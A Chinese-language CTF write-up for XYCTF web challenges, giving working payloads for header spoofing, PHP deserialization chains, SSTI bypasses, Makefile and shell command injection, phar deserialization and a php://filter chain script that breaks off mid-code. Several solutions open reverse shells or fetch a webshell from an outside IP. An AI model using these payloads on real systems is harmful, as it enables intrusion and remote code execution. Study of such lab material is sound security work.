[{"content":" web ezhttp 查看源码有提示\n敏锐的感觉robots.txt有东西\n直接看txt文件就好，拿到账户密码。\n根据响应改一下referer\n改代理\n最后显示要本地用户，直接打X-Forwarded-For: 127.0.0.1\n但是看响应，这个xff应该是被禁用了，打Client-IP: 127.0.0.1。常用的头有\n1 2 3 4 5 6 7 8 9 10 X-Forwarded-For:127.0.0.1 Client-ip:127.0.0.1 X-Client-IP:127.0.0.1 X-Remote-IP:127.0.0.1 X-Rriginating-IP:127.0.0.1 X-Remote-addr:127.0.0.1 HTTP_CLIENT_IP:127.0.0.1 X-Real-IP:127.0.0.1 X-Originating-IP:127.0.0.1 via:127.0.0.1 这里好像只能打Client-IP: 127.0.0.1，逆天\n显然是要加代理服务器-Via，Via: ymzx.qq.com（User-Agents是用户代理）\n这里饼干，显然是cookie，加上XYCTF，即可拿flag\n综合payload\n1 2 3 4 5 Referer: yuanshen.com User Agent: XYCTF Client-IP: 127.0.0.1 Via: ymzx.qq.com Cookie: XYCTF ezmd5 上传2张不同的图片时areEqual:true,md5Equal:false\n上传2张相同图片时恰恰相反\n所以可以猜测，应该只要符合两个都是true就可以拿flag，也就是说要找到2张md5值相同的图片。想必大家肯定做过字符的md5强比较，用fastcoll来完成，其实fastcoll也可以碰撞生成图片，操作就是将图片放到fastcoll就会生成2张MD5值相同的图片\n使用fastcoll生成字符串MD5碰撞-CSDN博客\n工具下载: https://github.com/iamjazz/Md5collision\nwarm up 都是弱比较，直接打payload了\n1 val1[]=1\u0026amp;val2[]=2\u0026amp;md5=0e215962017\u0026amp;XY=0e215962017\u0026amp;XYCTF=0e215962017 (0e215962017MD5加密也是0e开头，0e开头的字符会被php处理为0，非数字字符与数字字符比较也会处理为0，但是非数字与非数字比较不会）注意这里有extract($_GET)变量覆盖，所以可以重新给XYCTF赋值\n拿到下一关路由\n这里post提交的a用数组绕过preg_match,即a[]=1(intval中传入数组时，会判断数组中的是否存在元素，有则返回1，否则返回0，preg_match当检测的变量是数组的时候会报错并返回0)\n下面的preg_replace的考法看下文\nCTF-WEB：攻防世界 ics-05(preg_replace() 函数 /e 漏洞) - 乌漆WhiteMoon - 博客园\nPHP preg_replace() 函数 | 菜鸟教程\n所以这里get传a=/1/e\u0026amp;b=system('cat /flag')\u0026amp;c=1,post传a[]=1\nezMake 非预期 直接dirsearch扫一下直接出来/flag，flag就在里面\n还有大佬发现eval没过滤，直接打马\n1 echo \u0026#39;\u0026lt;?=eval(hex2bin(\u0026#34;6576616c28245f504f53545b22636d64225d293b\u0026#34;))?\u0026gt;\u0026#39; \u0026gt; 1.php #字符解码是$_POST[\u0026#34;cmd\u0026#34;]; 预期解 makefile怎么读取文件内容 - 问答 - 亿速云\n1 2 content := $(shell cat flag) echo $(shell cat flag)\t#试了试其实$(shell cat flag)\t就行 Makefile中使用的是GNU Make的语法。\nez?Make 解法一：nc反弹shell 1 nc 101.200.39.193 5000 -e sh 打反弹shell（bash被禁用了）\n解法二-考命令执行功底 上题的eval被禁用了，f l a g @ $ * ? / 也被过滤，还过滤许多命令执行的方法，测试一些下，more还可以用。所以有\n1 cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;more [0-z][0-z][0-z][0-z]\t#匹配符绕过过滤的flag 官方wp是\n1 cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd ..\u0026amp;\u0026amp;cd bin\u0026amp;\u0026amp;echo \u0026#34;Y2F0IC9mbGFn\u0026#34;|b[!b-z]se64 -d|b[!b-z]sh#匹配符绕过原型base64 -d|bash 这两个有异曲同工之妙，就是进入到bin目录里面，然后执行命令cat /flag。找时间要总结一个命令执行的字典\nεZ?¿м@Kε¿? 进入页面右键有源码提示，然后进入路由\n尝试一下，发现竟然是白名单,在makefile我们怎么只用这几个字符构造命令，看看下文\nMakefile的编写及四个特殊符号的意义@、$@、$^、$ - 春风一郎 - 博客园\n1 2 3 4 5 $@ --代表目标文件(target) $^ --代表所有的依赖文件(components) $\u0026lt; --代表第一个依赖文件(components中最左边的那个)。 尝试发现$\u0026lt;就是flag，也就是说这个时候怎么读取它了，从上面的文章我我们又知道\n1 2 3 4 5 \u0026#39; $ \u0026#39;符号的使用 美元符号$，主要扩展打开makefile中定义的变量 \u0026#39; $$ \u0026#39;符号的使用 $$ 符号主要扩展打开makefile中定义的shell变量 1 2 \u0026lt;符号用于重定向输入，即将命令的输入从一个文件中读取,而不是从标准输入（键盘） \u0026gt;符号用于重定向输出，即将命令的输出写入一个文件，而不是在屏幕上显示 然后打$$(\u0026lt;$\u0026lt;),就是执行shell命令-即执行\u0026lt;读取/flag内容\n我是一个复读机 提示用户名admin,直接跑字典，拿到密码asdqwe，感觉像是ssti，跑跑字典\n逆天，{{和{%禁用，打啥，但是看看题目，叫我输入英文字符，输中文的字符发现其中间的就可以正常进行ssti，不出意外是中文字符被替换成了{{}}。\n这里主要是_ [] ' \u0026quot; os被过滤（还一些关键词），ctfshow的原题\n很多解法，我的解法是：request+cookie\n1 的(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()的 1 a=__globals__;b=os;c=cat /flag request+get也行\n1 的(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()的\u0026amp;a=__globals__\u0026amp;c=cat%20/flag\u0026amp;b=os 牢牢记住，逝者为大 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php highlight_file(__FILE__); function Kobe($cmd) { if (strlen($cmd) \u0026gt; 13) { die(\u0026#34;see you again~\u0026#34;); } if (preg_match(\u0026#34;/echo|exec|eval|system|fputs|\\.|\\/|\\\\|/i\u0026#34;, $cmd)) { die(\u0026#34;肘死你\u0026#34;); } foreach ($_GET as $val_name =\u0026gt; $val_val) { if (preg_match(\u0026#34;/bin|mv|cp|ls|\\||f|a|l|\\?|\\*|\\\u0026gt;/i\u0026#34;, $val_val)) { return \u0026#34;what can i say\u0026#34;; }#检查 $_GET 参数中是否包含某些特定的字符串（如 bin、mv、cp、ls 等）或特殊字符（如 |、\u0026gt;、* 等 } return $cmd; } $cmd = Kobe($_GET[\u0026#39;cmd\u0026#39;]); echo \u0026#34;#man,\u0026#34; . $cmd . \u0026#34;,manba out\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; eval(\u0026#34;#man,\u0026#34; . $cmd . \u0026#34;,mamba out\u0026#34;); #man,,manba out 这里限制了不能超过13个字符，我们需要%0a截断#man的干扰，用%23注释掉\u0026quot;,manba out\u0026quot;，只剩11个字符，所以这里只能打\n1 `$_GET[1]`; 这里刚好11个字符（要执行的是PHP代码，因此需要分号；）接下来就是给1传参了\n姿势一：wget 在我们的vps写一个马，然后利用wget下载到当前目录，然后执行就行\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=wget 101.200.39.193:3000/kh.php 姿势二：nc反弹 bin被过滤那就拼接绕过\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=nc 101.200.39.193 5000 -e /b\u0026#39;\u0026#39;in/sh 其实可以更简单一点,这里连/都不需要\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=nc 101.200.39.193 5000 -e sh 姿势三-cp命令执行 1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=c\u0026#39;\u0026#39;p /[@-z][@-z][@-z]g 1.txt 姿势四-whois反弹 这个whois反弹的shell只能执行后面带的命令，所以直接打\n1 ?cmd=%0a`$_GET[1]`;%23\u0026amp;1=whois -h 101.200.39.193 -p 5000 `more /[b-z][b-z][@-z][b-z]` ezRCE 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php highlight_file(__FILE__); function waf($cmd){ $white_list = [\u0026#39;0\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;3\u0026#39;,\u0026#39;4\u0026#39;,\u0026#39;5\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;8\u0026#39;,\u0026#39;9\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;$\u0026#39;,\u0026#39;\u0026lt;\u0026#39;]; $cmd_char = str_split($cmd); foreach($cmd_char as $char){ if (!in_array($char, $white_list)){ die(\u0026#34;really ez?\u0026#34;); } } return $cmd; } $cmd=waf($_GET[\u0026#34;cmd\u0026#34;]); system($cmd); 【bashfuck】bashshell无字母命令执行原理 - FreeBuf网络安全行业门户\n02.利用shell脚本变量构造无字母数字命令 · 个人知识库\nLunix可以用$'\\xxx'的方式执行命令，xxx是字符ascii码的八进制形式，当我尝试$'\\154\\163'（ls）是有响应，但是执行$'154\\163\\40\\57'不行，原因上面文章也有，简单来说就是其直接将单引号包裹的内容整体当成了一个命令，不能直接利用。\n然后接下来这里我们想到bash里的一种语法：command [args] \u0026lt;\u0026lt;\u0026lt;[\u0026quot;]$word[\u0026quot;]，在这种语法下$word会展开并作为command的stdin，以此来继续执行命令，但是字母不可以用，这里有两个办法绕过。\n解法一：bash也转换为8进制 1 ?cmd=$\u0026#39;\\142\\141\\163\\150\u0026#39;\u0026lt;\u0026lt;\u0026lt;$\u0026#39;\\154\\163\\40\\57\u0026#39;\t#ls / 1 ?cmd=$\u0026#39;\\142\\141\\163\\150\u0026#39;\u0026lt;\u0026lt;\u0026lt;$\u0026#39;\\143\\141\\164\\40\\57\\146\\154\\141\\147\u0026#39; #cat /flag 解法二：环境变量$0代替bash 1 ?cmd=$0\u0026lt;\u0026lt;\u0026lt;$\u0026#39;\\143\\141\\164\\40\\57\\146\\154\\141\\147\u0026#39; #cat /flag ezPOP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class AAA { public $s; public $a; public function __toString() { echo \u0026#34;you get 2 A \u0026lt;br\u0026gt;\u0026#34;; $p = $this-\u0026gt;a; return $this-\u0026gt;s-\u0026gt;$p; } } class BBB { public $c; public $d; public function __get($name) { echo \u0026#34;you get 2 B \u0026lt;br\u0026gt;\u0026#34;; $a=$_POST[\u0026#39;a\u0026#39;]; $b=$_POST; $c=$this-\u0026gt;c; $d=$this-\u0026gt;d; if (isset($b[\u0026#39;a\u0026#39;])) { unset($b[\u0026#39;a\u0026#39;]); } call_user_func($a,$b)($c)($d); } } class CCC { public $c; public function __destruct() { echo \u0026#34;you get 2 C \u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;c; } } if(isset($_GET[\u0026#39;xy\u0026#39;])) { $a = unserialize($_GET[\u0026#39;xy\u0026#39;]); throw new Exception(\u0026#34;noooooob!!!\u0026#34;); } 这里链子构造很简单，就是这么命令执行有点难搞，但是想也不用想，肯定是在call_user_func($a,$b)($c)($d);下功夫。\ncall_user_func($a,$b)意思就是函数a将b作为参数调用，call_user_func($a,$b)($c)($d);这个就是嵌套了，call_user_func($a,$b)返回值作为函数调用c，然后其返回值又作为函数调用d。这有很多解法。\n用current 写一个测试代码试试,解释些函数\ncurrent()函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的\u0026quot;当前\u0026quot;元素，初始指向插入到数组中的第一个元素。其实就是返回数组第一个元素.（由于此题post是数组，所以只需要传b=sprintf就行）\nsprintf() 函数把格式化的字符串写入变量中。\n然后就是unset函数：PHP unset() 函数 | 菜鸟教程，unset看似会回收a，其实不影响，因为当执行 $b = $_POST 时，$b 是 $_POST 的独立副本。后续的 unset($b['a']) 只移除了副本中的 a，原始 $_POST['a'] 的值依然存在，所以不影响\n最终payload是:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php class AAA { public $s; public $a; } class BBB { public $c; public $d; } class CCC { public $c; } $a=new CCC(); $a-\u0026gt;c=new AAA(); $a-\u0026gt;c-\u0026gt;a=\u0026#34;1\u0026#34;; $a-\u0026gt;c-\u0026gt;s=new BBB(); $a-\u0026gt;c-\u0026gt;s-\u0026gt;c=\u0026#34;system\u0026#34;; $a-\u0026gt;c-\u0026gt;s-\u0026gt;d=\u0026#34;tac /f*\u0026#34;; echo serialize($a); 但是题目最后又throw new Exception(\u0026quot;noooooob!!!\u0026quot;);,这里考GC垃圾回收：浅析PHP GC垃圾回收机制及常见利用方式-先知社区\n绕过的第一个方法的话就是将payload去掉最后一个}\n1 O:3:\u0026#34;CCC\u0026#34;:1:{s:1:\u0026#34;c\u0026#34;;O:3:\u0026#34;AAA\u0026#34;:2:{s:1:\u0026#34;s\u0026#34;;O:3:\u0026#34;BBB\u0026#34;:2:{s:1:\u0026#34;c\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:1:\u0026#34;d\u0026#34;;s:7:\u0026#34;tac /f*\u0026#34;;}s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;1\u0026#34;;} post传\n1 a=current\u0026amp;b=sprintf 第二个方法，就是将echo serialize($a);改为echo serialize(array($a,0));\n得到的payload是\n1 a:2:{i:0;O:3:\u0026#34;CCC\u0026#34;:1:{s:1:\u0026#34;c\u0026#34;;O:3:\u0026#34;AAA\u0026#34;:2:{s:1:\u0026#34;s\u0026#34;;O:3:\u0026#34;BBB\u0026#34;:2:{s:1:\u0026#34;c\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:1:\u0026#34;d\u0026#34;;s:7:\u0026#34;tac /f*\u0026#34;;}s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}i:1;i:0;} 然后看上文GC垃圾回收知道将array($a,0)第二个索引置空\n1 a:2:{i:0;O:3:\u0026#34;CCC\u0026#34;:1:{s:1:\u0026#34;c\u0026#34;;O:3:\u0026#34;AAA\u0026#34;:2:{s:1:\u0026#34;s\u0026#34;;O:3:\u0026#34;BBB\u0026#34;:2:{s:1:\u0026#34;c\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:1:\u0026#34;d\u0026#34;;s:7:\u0026#34;tac /f*\u0026#34;;}s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}i:0;i:0;} 然后post一样就行。\n当然这里post还可以传\n1 a=current\u0026amp;b=current 但是这样的话$a-\u0026gt;c-\u0026gt;s-\u0026gt;c=\u0026ldquo;system\u0026rdquo;;就要变成$a-\u0026gt;c-\u0026gt;s-\u0026gt;c=array(\u0026ldquo;system\u0026rdquo;);因为current只能处理数组\n用implode函数 这个nb，又涨知识PHP implode() 函数\nimplode() 函数返回由数组元素组合成的字符串。\n也是很好理解，所以就可以post传\n1 a=implode\u0026amp;1=imp\u0026amp;2=lode get和上面一样\nwp做法：用 Closure 原生类的 fromCallable [PHP: Closure::fromCallable - Manual](https://www.php.net/manual/zh/closure.fromcallable.php#:~:text=Closure%3A%3AfromCallable — 将 callable 转换为闭包 使用当前范围从给定的 callback 创建并返回一个新的,从 PHP 8.1.0 开始， First-class 可调用语法 的语义与此方法相同。 要转换的回调。)\n详细讲解看上面。\n1 函数 myCustomMapper 函数接受一个回调函数和一个字符串作为参数。它将字符串按空格拆分为单词数组，然后对每个单词应用回调函数，并将结果以空格连接起来，最终返回处理后的字符串 所以post传\n1 a=Closure::fromCallable\u0026amp;0=Closure\u0026amp;1=fromCallable 1 这里的解释就是参数二次调用出 Closure::fromCallable 然后 Closure 加载后面第一个参数 system 形成回调函数然后加载第二个参数变成 system 的参数 get传一样。在这里感觉和implode差不多作用\nezSerialize 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php class Flag { public $token; public $password; public function __construct($a, $b) { $this-\u0026gt;token = $a; $this-\u0026gt;password = $b; } public function login() { return $this-\u0026gt;token === $this-\u0026gt;password; } } $a=new Flag($token,$password); $a-\u0026gt;password=\u0026amp;$a-\u0026gt;token; echo serialize($a); 考php的引用PHP引用(\u0026amp;)使用详解 - 美好的明天 - 博客园\n一个引用相等直接绕过，得到路由fpclosefpclosefpcloseffflllaaaggg.php\nPHP: 魔术方法 - Manual\n第二关有个__unserialize魔术，但是要7.4以上才可以用，题目是7.3，所以不考虑此魔术，而且如果你逆推链子也可以发现这里用不了。\n接下来链子就简单了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;?php class A { public $mack; public function __invoke() { $this-\u0026gt;mack-\u0026gt;nonExistentMethod(); } } class B { public $luo; public function __get($key){ echo \u0026#34;o.O\u0026lt;br\u0026gt;\u0026#34;; $function = $this-\u0026gt;luo; return $function(); } } class C { public $wang1; public function __call($wang1,$wang2) { include \u0026#39;flag.php\u0026#39;; echo $flag2; } } class D { public $lao; public $chen; public function __toString(){ echo \u0026#34;O.o\u0026lt;br\u0026gt;\u0026#34;; return is_null($this-\u0026gt;lao-\u0026gt;chen) ? \u0026#34;\u0026#34; : $this-\u0026gt;lao-\u0026gt;chen; } } class E { public $name = \u0026#34;xxxxx\u0026#34;; public $num; public function __unserialize($data) { echo \u0026#34;\u0026lt;br\u0026gt;学到就是赚到!\u0026lt;br\u0026gt;\u0026#34;; echo $data[\u0026#39;num\u0026#39;]; } public function __wakeup(){ if($this-\u0026gt;name!=\u0026#39;\u0026#39; || $this-\u0026gt;num!=\u0026#39;\u0026#39;){ echo \u0026#34;旅行者别忘记旅行的意义!\u0026lt;br\u0026gt;\u0026#34;; } } } $a=new E(); $a-\u0026gt;name=new D();\t#$this-\u0026gt;name = \u0026#39;\u0026#39;拿来跟字符串比较了，因此也会调用__toString方法 $a-\u0026gt;name-\u0026gt;lao=new B(); $a-\u0026gt;name-\u0026gt;lao-\u0026gt;luo=new A(); $a-\u0026gt;name-\u0026gt;lao-\u0026gt;luo-\u0026gt;mack=new C(); echo serialize($a); 得到saber_master_saber_master.php，进入第三关\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php class XYCTFNO1 { public $T1ng=\u0026#34;yuroandCMD258\u0026#34;; public $crypto0=\u0026#34;dev1l\u0026#34;; } class XYCTFNO2 { public $crypto0; public $adwa; } class XYCTFNO3 { public $KickyMu; public $fpclose; public $N1ght = \u0026#34;oSthing\u0026#34;; } $a=new XYCTFNO3(); $a-\u0026gt;KickyMu=new XYCTFNO2(); $a-\u0026gt;KickyMu-\u0026gt;adwa=new XYCTFNO1(); echo serialize($a); echo urlencode(serialize($a)); 这里考一个PHP8 动态属性被弃用兼容方案_creation of dynamic property is deprecated-CSDN博客\n即8.2以下的版本可以PHP 类中可以动态设置和获取没有声明过的类属性\n题目有点问题，应该是crypto0=\u0026ldquo;dev1l\u0026rdquo;。然后打原生类读取文件\n1 X=SplFileObject\u0026amp;Y=php://filter/read=convert.base64-encode/resource=flag.php ezClass 解法一：利用可执行函数的内置类 1 ?a=Exception\u0026amp;aa=system\u0026amp;b=Exception\u0026amp;bb=cat /flag\u0026amp;c=getMessage 1 Exception（异常类）,getMessage()（返回构造函数中的异常信息）,上面分别返回system,cat /flag,达到执行命令效果 解法二：原生类读取SplFileObject文件 1 ?a=SplFileObject\u0026amp;aa=data://text/plain,system\u0026amp;c=__toString\u0026amp;b=SplFileObject\u0026amp;bb=data://text/plain,cat%20/flag 解法三:利用ArrayIterator类调用current方法来返回当前的值 1 ?a=ArrayIterator\u0026amp;aa[]=system\u0026amp;c=current\u0026amp;b=ArrayIterator\u0026amp;bb[]=cat /flag PHP: ArrayIterator::current - PHP中文网\npharme 源码提示class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class evil{ public $cmd; public $a; public function __destruct(){ if(\u0026#39;ch3nx1\u0026#39; === preg_replace(\u0026#39;/;+/\u0026#39;,\u0026#39;ch3nx1\u0026#39;,preg_replace(\u0026#39;/[A-Za-z_\\(\\)]+/\u0026#39;,\u0026#39;\u0026#39;,$this-\u0026gt;cmd))){ eval($this-\u0026gt;cmd.\u0026#39;isbigvegetablechicken!\u0026#39;); } else { echo \u0026#39;nonono\u0026#39;; } } } if(isset($_POST[\u0026#39;file\u0026#39;])) { if(preg_match(\u0026#39;/^phar:\\/\\//i\u0026#39;,$_POST[\u0026#39;file\u0026#39;])) { die(\u0026#34;nonono\u0026#34;); } file_get_contents($_POST[\u0026#39;file\u0026#39;]); } 简单的phar反序列化，以前详细讲过https://luo-kaihong.github.io/p/2025-tgctf-write.up/\n这题思路，显然，先phar反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class evil{ public $cmd=\u0026#39;eval(end(getallheaders()));__halt_compiler();\u0026#39;; // 定义cmd属性，值为eval函数和__halt_compiler()函数 public function __destruct(){ // 定义析构函数 if(\u0026#39;ch3nx1\u0026#39; === preg_replace(\u0026#39;/;+/\u0026#39; , \u0026#39;ch3nx1\u0026#39; ,preg_replace(\u0026#39;/[A-Za-z_\\(\\\\)]+/\u0026#39; , \u0026#39;\u0026#39; ,$this-\u0026gt;cmd))){ // 使用正则表达式过滤cmd中的字母、下划线、括号等字符，然后替换分号为\u0026#39;ch3nx1\u0026#39;，判断是否等于\u0026#39;ch3nx1\u0026#39; eval($this-\u0026gt;cmd. // 如果条件成立，执行cmd命令 \u0026#39;isbigvegetablechicken!\u0026#39;); // 在cmd后面添加字符串\u0026#39;isbigvegetablechicken!\u0026#39;，然后执行 } else { echo \u0026#39;nonono\u0026#39;; // 如果条件不成立，输出\u0026#39;nonono\u0026#39; } } } $a =new evil(); // 创建evil类的实例$a $phar = new Phar(\u0026#39;1.phar\u0026#39;); # 生成名为1.phar的Phar文件 $phar-\u0026gt;stopBuffering(); # 停止缓冲，直接写入文件 $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39; . \u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); # 设置stub，以GIF89a开头，后面跟着__HALT_COMPILER()，使Phar文件看起来像图片文件 $phar-\u0026gt;setMetadata($a); # 将$a作为元数据写入Phar文件，用于反序列化 $phar-\u0026gt;addFromString(\u0026#39;1.txt\u0026#39;, \u0026#39;1\u0026#39;); # 向Phar文件添加内容为\u0026#39;1\u0026#39;的1.txt文件 $phar-\u0026gt;stopBuffering(); # 再次停止缓冲，确保所有内容都已写入 ?\u0026gt; 来解释一下这个代码特殊之处，这个源码显然是告诉我们只能含有字母A-Z，a-z，下划线_和左右括号()，其实也就是无参RCE，那就打\n1 2 eval(end(getallheaders())); 请求头最后一行:system(\u0026#39;cat /flag\u0026#39;) ByteCTF一道题的分析与学习PHP无参数函数的利用-先知社区\n1 然后为了注释\u0026#39;isbigvegetablechicken!\u0026#39;，用__halt_compiler();（eval中的字符串是拼接的，且不能用#和//进行注释） 环境配置分享的第一篇文章有讲，然后生成phar文件，测试发现只能上传图片，改后缀发现报错\n1 !preg_match(“/__HALT_COMPILER/i”,FILE_CONTENTS) 说明还是发现是phar文件，所以gzip压缩一下（liunx环境执行）\n1 gzip 1.phar 然后改后缀为1.png上传得到路径/tmp/4a47a0db6e60853dedfcfdf08a5ca249.png\n然后绕过掉phar://开头的正则，本来想打compress.zlib绕过，后面了解是要开启zip拓展才有的，这里用不了\nphp反序列化拓展攻击详解\u0026ndash;phar-先知社区\n所以就用伪协议打\n1 file=php://filter/resource=phar:///tmp/4a47a0db6e60853dedfcfdf08a5ca249.png 抓包后就在请求头最后执行命令就好了\n这题考的挺多知识点：\nphar反序列化+无参rce+__halt_compiler来终止编译+gzip压缩绕过phar文件检测+伪协议绕过phar头检测\nezLFI 题目附件有index.php源码就是\n1 \u0026lt;?php include_once($_REQUEST[\u0026#39;file\u0026#39;]); 读附件给的docker-entrypoint.sh 发现chmod 400 /flag # 设置只读权限,但是发现/readflag可以执行，然后其执行可以读取flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 rm -f /docker-entrypoint.sh # 清理默认Docker入口脚本 user=$(ls /home) # 获取/home目录用户列表（ls解析存在风险） INSERT_FLAG=\u0026#34;flag{TEST_FLAG}\u0026#34; # 定义预设flag值 echo $INSERT_FLAG | tee /flag # 写入flag到系统根目录 chmod 400 /flag # 设置只读权限（400=rw-------） cd /build # 进入编译目录 musl-gcc -s -oreadflag -Os -static readflag.c # 静态编译可执行文件（-s去符号表，-Os优化体积） cp /build/readflag / # 部署到根目录 chmod u=srx,g=rx,o=x /readflag # 设置SUID权限（s=提权，rx=可读执行） /etc/init.d/php7.4-fpm start \\ # 启动PHP-FPM服务 \u0026amp;\u0026amp; nginx -g \u0026#39;daemon off;\u0026#39; # 前台启动Nginx（\u0026amp;\u0026amp;确保顺序执行） tail -f /dev/null # 保持容器存活（阻塞进程防退出） 所以这里显然这里是文件包含执行命令，那就是用就是filterChain。具体看\n利用filter过滤器的编码组合构造RCE-腾讯云开发者社区-腾讯云\nphp://filter特性包含任意文件getshell | CTF导航\nhttps://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n简单就是通过不同的编码转换构造字符\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import requests url = \u0026#34;http://localhost:49819/?file=\u0026#34; file_to_use = \u0026#34;/etc/passwd\u0026#34; command = \u0026#34;/readflag\u0026#34; # \u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = 